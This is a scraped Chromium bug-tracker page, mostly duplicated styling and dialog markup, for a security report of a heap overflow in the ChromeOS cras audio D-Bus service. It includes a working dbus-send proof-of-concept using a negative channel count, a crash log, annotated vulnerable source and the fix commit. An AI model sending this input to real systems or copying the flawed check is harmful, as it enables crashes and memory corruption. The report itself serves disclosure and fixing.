          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }

          mr-issue-details, mr-launch-overview {
            width: 100%;

            border: 0;
          }

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

          Note:<b>Note:</b>
          Clock icons indicate that users may not be available.
          Tooltips show the reason.

      Steps to reproduce the problem:<b class="line"><!---->Steps to reproduce the problem:<!----></b><br>1.The cras D-Bus service has a method called SetGlobalOutputChannelRemix. The num_channels can be arbitrarily integer sent as a by an attacker. The handler for this method lives in cras_dbus_control.c, which will cause heap  overflow in cras<span class="line"><!---->1.The cras D-Bus service has a method called SetGlobalOutputChannelRemix. The num_channels can be arbitrarily integer sent as a by an attacker. The handler for this method lives in cras_dbus_control.c, which will cause heap  overflow in cras<!----></span><br>2.I test it in chromeos vm<span class="line"><!---->2.I test it in chromeos vm<!----></span><br>```<span class="line"><!---->```<!----></span><br>dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<span class="line"><!---->dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<!----></span><br>``<span class="line"><!---->``<!----></span><br>3.the /var/log/messages will show that <span class="line"><!---->3.the /var/log/messages will show that <!----></span><br>```<span class="line"><!---->```<!----></span><br>2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault at 0 ip 00005a922c51c0f2 sp 00007ffedb877590 error 4 in cras[5a922c506000+b7000]<span class="line"><!---->2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault at 0 ip 00005a922c51c0f2 sp 00007ffedb877590 error 4 in cras[5a922c506000+b7000]<!----></span><br>2023-03-01T17:20:02.251763Z INFO kernel: [ 4422.241569] Code: 45 89 e1 41 83 e1 03 41 ba 08 00 00 00 45 31 db 45 31 ed eb 15 0f 1f 00 49 ff c5 41 01 da 4d 01 e3 4d 39 e5 0f 84 76 01 00 00 <4e> 8b 04 e8 83 fb 0c 0f 83 a1 00 00 00 31 ff 49 89 fe 49 f7 d6 4d<span class="line"><!---->2023-03-01T17:20:02.251763Z INFO kernel: [ 4422.241569] Code: 45 89 e1 41 83 e1 03 41 ba 08 00 00 00 45 31 db 45 31 ed eb 15 0f 1f 00 49 ff c5 41 01 da 4d 01 e3 4d 39 e5 0f 84 76 01 00 00 &lt;4e&gt; 8b 04 e8 83 fb 0c 0f 83 a1 00 00 00 31 ff 49 89 fe 49 f7 d6 4d<!----></span><br><br><br>bitset:<span class="line"><!---->bitset:<!----></span><br>[1] <span class="line"><!---->[1] <!----></span>https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<a class="undefined" target="_blank" href="https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723"><!---->https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<!----></a><br><br>Problem Description:<b class="line"><!---->Problem Description:<!----></b><br>above all<span class="line"><!---->above all<!----></span><br><br>Additional Comments:<b class="line"><!---->Additional Comments:<!----></b><br><br><br>Chrome version: <b class="line"><!---->Chrome version: <!----></b>110.0.0.0 <span class="line"><!---->110.0.0.0 <!----></span>Channel: <b class="line"><!---->Channel: <!----></b>Not sure<span class="line"><!---->Not sure<!----></span><br><br>OS:<b class="line"><!---->OS:<!----></b>Chrome OS<span class="line"><!---->Chrome OS<!----></span><mr-comment-content></mr-comment-content>

        though the commit (<span class="line"><!---->though the commit (<!----></span>https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<a class="undefined" target="_blank" href="https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723"><!---->https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<!----></a>)<span class="line"><!---->)<!----></span> fix the heap overflow, but I find a way to cause heap overflow<span class="line"><!----> fix the heap overflow, but I find a way to cause heap overflow<!----></span><br><br>in the function handle_set_global_output_channel_remix(<span class="line"><!---->in the function handle_set_global_output_channel_remix(<!----></span>https://source.chromium.org/chromiumos/chromiumos/codesearch/+/main:src/third_party/adhd/cras/src/server/cras_dbus_control.c;l=982;drc=4d04a9812a03c1fbe49a9b30a954f30344015773;bpv=0;bpt=1<a class="undefined" target="_blank" href="https://source.chromium.org/chromiumos/chromiumos/codesearch/+/main:src/third_party/adhd/cras/src/server/cras_dbus_control.c;l=982;drc=4d04a9812a03c1fbe49a9b30a954f30344015773;bpv=0;bpt=1"><!---->https://source.chromium.org/chromiumos/chromiumos/codesearch/+/main:src/third_party/adhd/cras/src/server/cras_dbus_control.c;l=982;drc=4d04a9812a03c1fbe49a9b30a954f30344015773;bpv=0;bpt=1<!----></a>)<span class="line"><!---->)<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>static DBusHandlerResult<span class="line"><!---->static DBusHandlerResult<!----></span><br>handle_set_global_output_channel_remix(DBusConnection *conn,<span class="line"><!---->handle_set_global_output_channel_remix(DBusConnection *conn,<!----></span><br>				       DBusMessage *message, void *arg)<span class="line"><!---->				       DBusMessage *message, void *arg)<!----></span><br>{<span class="line"><!---->{<!----></span><br>       .......................<span class="line"><!---->       .......................<!----></span><br>	if (!dbus_message_get_args(message, &dbus_error, DBUS_TYPE_INT32,<span class="line"><!---->	if (!dbus_message_get_args(message, &amp;dbus_error, DBUS_TYPE_INT32,<!----></span><br>				   &num_channels, DBUS_TYPE_ARRAY,         ---------------------->>>>we get num_channels as integer so we can set it to -65536<span class="line"><!---->				   &amp;num_channels, DBUS_TYPE_ARRAY,         ----------------------&gt;&gt;&gt;&gt;we get num_channels as integer so we can set it to -65536<!----></span><br>				   DBUS_TYPE_DOUBLE, &coeff_array, &count,<span class="line"><!---->				   DBUS_TYPE_DOUBLE, &amp;coeff_array, &amp;count,<!----></span><br>				   DBUS_TYPE_INVALID)) {<span class="line"><!---->				   DBUS_TYPE_INVALID)) {<!----></span><br>		syslog(LOG_WARNING, "Set global output channel remix error: %s",<span class="line"><!---->		syslog(LOG_WARNING, "Set global output channel remix error: %s",<!----></span><br>		       dbus_error.message);<span class="line"><!---->		       dbus_error.message);<!----></span><br>		dbus_error_free(&dbus_error);<span class="line"><!---->		dbus_error_free(&amp;dbus_error);<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br>	}<span class="line"><!---->	}<!----></span><br>	if (num_channels > CRAS_CH_MAX) {         ------------------------>> -65536 can pass it.<span class="line"><!---->	if (num_channels &gt; CRAS_CH_MAX) {         ------------------------&gt;&gt; -65536 can pass it.<!----></span><br>		syslog(LOG_WARNING,<span class="line"><!---->		syslog(LOG_WARNING,<!----></span><br>		       "Set global output channel remix error: num_channels[%d] exceeds %d",<span class="line"><!---->		       "Set global output channel remix error: num_channels[%d] exceeds %d",<!----></span><br>		       num_channels, CRAS_CH_MAX);<span class="line"><!---->		       num_channels, CRAS_CH_MAX);<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br>	}<span class="line"><!---->	}<!----></span><br><br>	if (num_channels * num_channels != count) {          ------------------------------>>> -65536 * -65536 = 0 (int32)    so we can pass the check with the empty array<span class="line"><!---->	if (num_channels * num_channels != count) {          ------------------------------&gt;&gt;&gt; -65536 * -65536 = 0 (int32)    so we can pass the check with the empty array<!----></span><br>		syslog(LOG_WARNING,<span class="line"><!---->		syslog(LOG_WARNING,<!----></span><br>		       "Set global output channel remix error: Invalid argument, coeff_array size[%d] != num_channels[%d]*num_channels[%d]",<span class="line"><!---->		       "Set global output channel remix error: Invalid argument, coeff_array size[%d] != num_channels[%d]*num_channels[%d]",<!----></span><br>		       count, num_channels, num_channels);<span class="line"><!---->		       count, num_channels, num_channels);<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br>	}<span class="line"><!---->	}<!----></span><br><br>	coefficient = (float *)calloc(count, sizeof(*coefficient));   it will calloc(0)<span class="line"><!---->	coefficient = (float *)calloc(count, sizeof(*coefficient));   it will calloc(0)<!----></span><br>	if (!coefficient)<span class="line"><!---->	if (!coefficient)<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br><br>	for (i = 0; i < count; i++)<span class="line"><!---->	for (i = 0; i &lt; count; i++)<!----></span><br>		coefficient[i] = coeff_array[i];<span class="line"><!---->		coefficient[i] = coeff_array[i];<!----></span><br><br>	audio_thread_config_global_remix(cras_iodev_list_get_audio_thread(),<span class="line"><!---->	audio_thread_config_global_remix(cras_iodev_list_get_audio_thread(),<!----></span><br>					 num_channels, coefficient);         -------------->> here num_channels will be converted to a uint32 value, will cause the heap overflow coeff_array<span class="line"><!---->					 num_channels, coefficient);         --------------&gt;&gt; here num_channels will be converted to a uint32 value, will cause the heap overflow coeff_array<!----></span><br><br>	send_empty_reply(conn, message);<span class="line"><!---->	send_empty_reply(conn, message);<!----></span><br>	free(coefficient);<span class="line"><!---->	free(coefficient);<!----></span><br>	return DBUS_HANDLER_RESULT_HANDLED;<span class="line"><!---->	return DBUS_HANDLER_RESULT_HANDLED;<!----></span><br>}<span class="line"><!---->}<!----></span><br>```<span class="line"><!---->```<!----></span><mr-comment-content></mr-comment-content>

If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.<span class="line"><!---->6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.<!----></span><br>1. send commnad dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<span class="line"><!---->1. send commnad dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<!----></span><br>2. make sure /var/log/message don't show anything like 2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault<span class="line"><!---->2. make sure /var/log/message don't show anything like 2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault<!----></span><mr-comment-content></mr-comment-content>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users.         The following revision refers to this bug:<span class="line"><!---->The following revision refers to this bug:<!----></span><br>  <span class="line"><!---->  <!----></span>https://chromium.googlesource.com/chromiumos/third_party/adhd/+/c36b659c5cfb877f751cc4178ccb5a333b8772f7<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromiumos/third_party/adhd/+/c36b659c5cfb877f751cc4178ccb5a333b8772f7"><!---->https://chromium.googlesource.com/chromiumos/third_party/adhd/+/c36b659c5cfb877f751cc4178ccb5a333b8772f7<!----></a><br><br>commit <span class="line"><!---->commit <!----></span>c36b659c5cfb877f751cc4178ccb5a333b8772f7<a class="undefined" target="_blank" href="https://crrev.com/c36b659c5cfb877f751cc4178ccb5a333b8772f7"><!---->c36b659c5cfb877f751cc4178ccb5a333b8772f7<!----></a><br>Author: whalechang <<span class="line"><!---->Author: whalechang &lt;<!----></span>whalechang@google.com<a class="undefined" target="_blank" href="/u/whalechang@google.com"><!---->whalechang@google.com<!----></a>><span class="line"><!---->&gt;<!----></span><br>Date: Fri Mar 03 05:17:54 2023<span class="line"><!---->Date: Fri Mar 03 05:17:54 2023<!----></span><br><br>Dbus: fix edge case in SetGlobalOutputChannelRemix<span class="line"><!---->Dbus: fix edge case in SetGlobalOutputChannelRemix<!----></span><br><br>In handle_set_global_output_channel_remix,<span class="line"><!---->In handle_set_global_output_channel_remix,<!----></span><br>If num_channels is negative number, it can pass the input parameter check.<span class="line"><!---->If num_channels is negative number, it can pass the input parameter check.<!----></span><br><br>Fix the problem by refusing negative number from dbus input.<span class="line"><!---->Fix the problem by refusing negative number from dbus            issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      <style>

      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.

          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      <div class="chops-autocomplete-container">
        <span class="screenreader-hidden" aria-live="polite">
          
        </span>
        <table hidden="">
          <tbody>
            
          </tbody>
        </table>
      </div>
    <!----></mr-autocomplete>
            </div>
          </div>

              Cancel
            </chops-button>
            <chops-button class="emphasized">

            </chops-button>
          </div>
        </div>

       Note: Avoiding 2-way data binding to futureproof this code
        for LitElement.

      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;

          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;

        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;

          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);

          mr-issue-metadata {

            max-width: auto;
            width: 100%;

            min-height: 0;

          }
          mr-issue-metadata, .issue-header-container {

          }
        }

          </aside>

        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;

          padding-right: var(--mr-issue-page-horizontal-padding);

          overflow-y: auto;

          height: calc(100vh - var(--monorail-header-height));

            width: 100%;

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>

          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

            Issue 1420790: Security: ChromeOS cras D-Bus audio_thread_config_global_remix memory corruption
          <h1>
            
            Issue 1420790: Security: ChromeOS cras D-Bus audio_thread_config_global_remix memory corruption
          </h1>
          
            Reported by
            
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      schedule<i id="availability-icon" class="material-icons inline-icon ${user.last_visit_timestamp ? '': 'inline-icon-unseen'}" title="undefined" hidden="">schedule</i>
      wxhu...@gmail.com<a id="user-link" href="/u/1283894224" title="wxhu...@gmail.com"><!---->wxhu...@gmail.com<!----></a>
      wxhu...@gmail.com<span id="user-text" hidden=""><!---->wxhu...@gmail.com<!----></span>
      <div id="availability-text" class="availability-notice" title="undefined" hidden=""><!----><!----></div>
    <mr-user-link aria-label="issue reporter"></mr-user-link>
            on 
      Wed, Mar 1, 2023, 6:30 PM EST
    <chops-timestamp title="Wed, Mar 1, 2023, 6:30 PM EST"></chops-timestamp>
            
          <small class="byline">

            <mr-user-link aria-label="issue reporter"></mr-user-link>
            on <chops-timestamp title="Wed, Mar 1, 2023, 6:30 PM EST"></chops-timestamp>
            
          </small>
        <div class="main-text">
          <h1>
            
            Issue 1420790: Security: ChromeOS cras D-Bus audio_thread_config_global_remix memory corruption
          </h1>
          <small class="byline">
            Reported by
            <mr-user-link aria-label="issue reporter"></mr-user-link>
            on <chops-timestamp title="Wed, Mar 1, 2023, 6:30 PM EST"></chops-timestamp>
            
          </small>
        </div>
      <div class="main-text-outer">
        <div class="main-text">
          <h1>
            
            Issue 1420790: Security: ChromeOS cras D-Bus audio_thread_config_global_remix memory corruption
          </h1>

      Steps to reproduce the problem:<b class="line"><!---->Steps to reproduce the problem:<!----></b><br>1.The cras D-Bus service has a method called SetGlobalOutputChannelRemix. The num_channels can be arbitrarily integer sent as a by an attacker. The handler for this method lives in cras_dbus_control.c, which will cause heap  overflow in cras<span class="line"><!---->1.The cras D-Bus service has a method called SetGlobalOutputChannelRemix. The num_channels can be arbitrarily integer sent as a by an attacker. The handler for this method lives in cras_dbus_control.c, which will cause heap  overflow in cras<!----></span><br>2.I test it in chromeos vm<span class="line"><!---->2.I test it in chromeos vm<!----></span><br>```<span class="line"><!---->```<!----></span><br>dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<span class="line"><!---->dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<!----></span><br>``<span class="line"><!---->``<!----></span><br>3.the /var/log/messages will show that <span class="line"><!---->3.the /var/log/messages will show that <!----></span><br>```<span class="line"><!---->```<!----></span><br>2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault at 0 ip 00005a922c51c0f2 sp 00007ffedb877590 error 4 in cras[5a922c506000+b7000]<span class="line"><!---->2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault at 0 ip 00005a922c51c0f2 sp 00007ffedb877590 error 4 in cras[5a922c506000+b7000]<!----></span><br>2023-03-01T17:20:02.251763Z INFO kernel: [ 4422.241569] Code: 45 89 e1 41 83 e1 03 41 ba 08 00 00 00 45 31 db 45 31 ed eb 15 0f 1f 00 49 ff c5 41 01 da 4d 01 e3 4d 39 e5 0f 84 76 01 00 00 <4e> 8b 04 e8 83 fb 0c 0f 83 a1 00 00 00 31 ff 49 89 fe 49 f7 d6 4d<span class="line"><!---->2023-03-01T17:20:02.251763Z INFO kernel: [ 4422.241569] Code: 45 89 e1 41 83 e1 03 41 ba 08 00 00 00 45 31 db 45 31 ed eb 15 0f 1f 00 49 ff c5 41 01 da 4d 01 e3 4d 39 e5 0f 84 76 01 00 00 &lt;4e&gt; 8b 04 e8 83 fb 0c 0f 83 